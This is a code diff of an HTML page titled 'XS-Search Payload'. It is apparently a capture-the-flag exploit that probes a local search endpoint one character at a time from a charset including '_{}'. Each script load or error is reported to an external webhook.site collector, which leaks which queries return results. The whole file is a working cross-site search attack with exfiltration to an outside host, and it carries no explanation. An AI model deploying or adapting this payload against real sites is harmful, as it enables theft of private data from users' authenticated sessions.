@@ -1,15 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>XS-Search Payload</title>
+</head>
+<body>
 <script>
-function test(char) {
-  let s = document.createElement('script');
-  s.src = `http://127.0.0.1:8000/search?query=${char}`;
-  s.onload = () => {
-    fetch("https://webhook.site/45bcf449-d452-4bb5-a56f-c71d451ca12e" + char);
-  };
-  s.onerror = () => {
-    fetch("https://webhook.site/45bcf449-d452-4bb5-a56f-c71d451ca12e" + char);
-  };
-  document.body.appendChild(s);
-}
-
-test('D'); 
+  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
+  
+  for (let i = 0; i < charset.length; i++) {
+    const char = charset[i];
+    let s = document.createElement('script');
+    s.src = `http://127.0.0.1:8000/search?query=${char}`;
+    s.onload = () => {
+      fetch("https://webhook.site/45bcf449-d452-4bb5-a56f-c71d451ca12e/success?char=" + char);
+    };
+    s.onerror = () => {
+      fetch("https://webhook.site/45bcf449-d452-4bb5-a56f-c71d451ca12e/fail?char=" + char);
+    };
+    document.body.appendChild(s);
+  }
 </script>
+</body>
+</html>
